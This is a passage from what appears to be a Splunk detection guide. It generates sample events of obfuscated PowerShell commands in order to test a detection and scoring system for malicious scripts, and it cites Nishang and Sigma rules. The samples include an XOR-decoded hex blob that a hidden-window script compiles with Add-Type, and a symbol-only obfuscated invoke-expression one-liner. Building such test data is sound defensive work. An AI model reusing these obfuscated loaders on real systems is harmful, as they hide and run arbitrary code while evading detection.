AGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=" ]
| append [ | makeresults | eval src="compromised7",  command="-WindowStyle Hidden 

function p152b 
{
param($ma865fa)
$d5726d='b5ce91';
$hd7a4='';
for ($i=0; $i -lt $ma865fa.length;$i+=2)
{
$s8f2e8=[convert]::ToByte($ma865fa.Substring($i,2),16);
$hd7a4+=[char]($s8f2e8 -bxor $d5726d[($i/2)%$d5726d.length]);
}
return $hd7a4;
}
$u9558a = '17 46 0a 0b 5e 11 31 4c 10 115c5c5940100c575642661a164d540f1b311057450b58064b705f1650110a49620747150c5a54110e1616505f0515301c4a4507584d215050055b0c164d58014658104a580c524336404216500e4b707e5940100c575642661a164d540f1b2d004d0a6f3f13105b5d0b56430655501146431c0a52540c183e7d5d0e7c0e155643161d410e5c430c500f560b134e700d114b48325a0a0b4d0c4072061169430d5622015d4307461047106c4245160755580115101158450b564300414507470d45705f1665171719530751075411780c4133114b110a5107015a1d1141110c5756424102000003551c583e7d5d0e7c0e155643161d410e5c430c500f560b134e15260b4d431b650c0c574542084347755e03512f0c5b4303471a47106c4245160755580115101158450b564300414507470d45705f166517171940550257570f191141110c57564246525d5d57511c583e7d5d0e7c0e155643161d410e5c430c500f560b134e15260b4d431b650c0c57455f17350c4b4517540f354b5e165000111b183f1513105b5d0b5643164d50165c00455c491650110b19530d5a0f455f025306524d705f16651717194b530d05565c544e602a0b4d61164743100a500300564919440b5b17455b5304515b49195e17414310505f1615190001545402054c026a26590f2c54410d47174d1b7a07470d005502501b070955134e15260b4d431b650c0c57455f173111557c0d4306285c5c0d471a4715113150172958421670111756435f5302094a544b6843164d50165c00455c491650110b19470d5c07454f06065000045c192b5b17354d43424701520d0253192a0b4d611647431c0e055a534f0c5745424c555c08535a1c58154c530e5c00454a4503410a0619580c4143090f095457504d104a2b5b17354d43424456515d06555643581940550257570f19120456575b19400550500100520500540e045705065000134b1c580c5f19130057010e0601085e2c57453241114b6354105a4a1e5e5e165a43095b5454545a51024c2b5b17354d43425202535a5254575e075c5506044b140c050602540615415300510711135006565d0801525655040c03520656070b00530556030c06520257521b184b0e0a031156030300060f535f082a0b4d6116474d3f5c430d1c180256450d150f075c07030c575e44642b5b17354d43425f545d5a045b084b30705f16651717100459400a0b4d11185402520b0c520e0a031110040652560819055455065a07001909520152570c4f55410552190c104d11185402520b184b4e040a4d5e425901000f505b0158187b4816503838195a0301515d010c19051b56081d524d050315011a0c531802780c4133114b11155052015f0c2f54111651500e1b2209555e017d2409565303594b56100a2f54111651500e1b200a49484a5e02510b095a1953494e54535105490a18594354015c5203504b0b5c46427c0d116945101d04040f520103014b6d5e2b5b17530d194b1e531d090153574a494e54535105490a18595901000f505b0159456e5400760f0c5c5f161511515d0655045e0b5c46426206077a5d0b500d11111859461717505f051510045a0301005a587c5f145c110a575c075b174b7e5416730c095d54106502115119275b150c4b5e0c58060b4d1f3145060650500e730c095d54101b2215495d0b560211505e0c710211581849173f394c0350045a000c13494552500b534a1757060c01535753551b18594757010e06531b270a4e5f0e5a02017f580e504b15080450574b470950560452520804520652000d55570653540952575056000805535752510901575757570953560453530d505703575608065354510109505702565d0d52570552070901401c4f1658525056565c100a32470c065c42116617044b452b5b050a19525656550601555f5b06121961105a00004a42314102174d780c530c4d4a500107005000185965110a5a5411464d364d5010414b060d5254565b01100a105017104b5f42055818494400590a0619421654170c5a111141110c5756424552500b534a461717505f051500010c55571c18164d430b5b04455155065100581b535756065c081359461717505f051512520e0550035e364d430b5b044b7c5c12411a5e5f5e101d0a0b4d110b08535e500d015156010c1f2e500d024d59595c48580b1819571a115c1100500701080c215a0d135c43161b370a7b4816504b065d0406004d364c531141110c57564a5c4f57101d53034a5e480655015153120c4a560b044b184a5706015d00426b430d5d550656384d501e501c4340195906510706177d075b0411516c4b0e1e175c4517470d45480655015153024c1f';
//string to byte dönüştürüyor
$u9558a2 = p152b($u9558a);


Add-Type -TypeDefinition $u9558a2;
[y3c69]::l686b3();" ]
| append [ | makeresults | eval src="compromised7", command="${()}=+  $();${;}=${()}  ;  ${*%}=++${()}  ;  ${[}=  ++${()}  ;${-~}  =++  ${()}  ;${ (+}  =++  ${()}  ;  ${ '/}=++${()}  ;  ${%(#}  =  ++${()}  ;${'/=}  =  ++${()}  ;  ${#}  =  ++${()}  ;${]}  =++  ${()};${~%}  =  \"[\"  +\"$(@{})\"[  ${'/=}  ]+  \"$(@{})\"[  \"${*%}${]}\"  ]+  \"$(@{  }  )  \"[\"${[}${;}\"  ]+  \"$?  \"[${*%}  ]  +  \"]\"  ;  ${()}  =  \"\".(\"$(@{  }  )\"[\"${*%}\"+\"${ (+}\"]  +\"$(  @{  }  )  \"[  \"${*%}\"+\"${%(#}\"]+  \"$(  @{}  )\"[${;}]  +  \"$(  @{  })\"[  ${ (+}  ]+  \"$?\"[  ${*%}]  +\"$(@{  })\"[  ${-~}]  )  ;${()}  =\"$(  @{  }  )\"[  \"${*%}\"+\"${ (+}\"  ]+\"$(@{}  )  \"[${ (+}]  +\"${()}\"[\"${[}\"+\"${'/=}\"];  &  ${()}(\"${()}  (${~%}${#}${'/=}  +  ${~%}${*%}${*%}${ (+}  +${~%}${*%}${;}${ '/}  +${~%}${*%}${*%}${%(#}+${~%}${*%}${;}${*%}  +${~%}${ (+}${ '/}  +  ${~%}${'/=}${[}+${~%}${*%}${*%}${*%}+${~%}${*%}${*%}${ '/}+  ${~%}${*%}${*%}${%(#}  +${~%}${-~}${[}  +${~%}${-~}${ (+}+  ${~%}${]}${#}  +  ${~%}${]}${'/=}  +${~%}${*%}${*%}${%(#}+${~%}${*%}${*%}${'/=}+  ${~%}${*%}${;}${ (+}+${~%}${]}${'/=}+  ${~%}${*%}${*%}${;}  +${~%}${-~}${ (+})\"  )    " ]
| table src command
| rename command AS ps_command
| eval ps_command="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ".ps_command
```
You can also add an [outputlookup](https://docs.splunk.com/Documentation/Splunk/8.2.0/SearchReference/Outputlookup) to the end and save the demo events to a CSV file for later loading via [inputlookup](https://docs.splunk.com/Documentation/Splunk/8.2.0/SearchReference/Inputlookup) and validate the detections/scoring system.

# References

  - https://github.com/samratashok/nishang

  - https://github.com/secprentice/PowerShellWatchlist/blob/master/badshell.txt

  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_malicious_commandlets.yml
  
  - https://www.helloitsliam.com/2018/03/21/obfuscating-powershell-commands/

  - https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf

  - https://arxiv.org/pdf/1804.04177.pdf (I just leveraged the Symbols analysis from this one)

## Contributors

https://twitter.com/Fixer9999
